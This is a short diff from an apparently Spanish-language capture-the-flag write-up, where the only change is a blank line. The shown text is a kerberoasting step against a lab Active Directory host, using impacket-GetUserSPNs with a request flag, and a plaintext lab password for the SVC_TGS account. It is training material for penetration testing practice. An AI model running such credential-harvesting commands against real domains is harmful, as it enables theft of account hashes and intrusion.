@@ -91,6 +91,7 @@ Vale, tenemos unas credenciales válidas, pero no tenemos forma de conectarnos: 
 Como tenemos credenciales, podemos probar kerberoasting para ver si capturamos algún hash de otro usuario:
 
 ``impacket-GetUserSPNs -request -dc-ip 10.10.10.100 active.htb/SVC_TGS``
+
 -> Password: GPPstillStandingStrong2k18
 
 ![16](Images/16.png)
